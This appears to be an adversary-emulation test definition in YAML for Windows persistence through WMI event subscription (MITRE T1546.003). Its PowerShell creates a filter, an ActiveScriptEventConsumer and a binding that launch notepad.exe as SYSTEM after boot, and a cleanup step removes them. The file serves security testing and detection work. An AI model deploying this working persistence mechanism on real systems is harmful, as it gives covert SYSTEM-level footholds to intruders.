api_version: "2.0"
name: Persistence via WMI Event Subscription - ActiveScriptEventConsumer
description: |
    Run from an administrator powershell window. After running, reboot the victim machine.
    After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

    Code references

    https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c
uuid: fecd0dfd-fb55-45fa-a10b-6250272d0832
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
    subtechniques:
        - 'T1546.003: Windows Management Instrumentation Event Subscription'
requirements:
    platforms:
        - os: windows
steps:
    - name: persistence-via-wmi-event-subscription---activescripteventconsumer
      inline: |
        $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                        EventNameSpace='root\CimV2';
                        QueryLanguage="WQL";
                        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        $Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

        $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                        ScriptingEngine='VBScript';
                        ScriptText='
                        Set objws = CreateObject("Wscript.Shell")
                        objws.Run "notepad.exe", 0, True
                        '}
        $Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

        $FilterToConsumerArgs = @{
        Filter = $Filter;
        Consumer = $Consumer;
        }
        $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
      executor: powershell
      cleanup:
        inline: |
            $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
            $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
            $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
            $FilterConsumerBindingToCleanup | Remove-WmiObject
            $EventConsumerToCleanup | Remove-WmiObject
            $EventFilterToCleanup | Remove-WmiObject
        executor: powershell
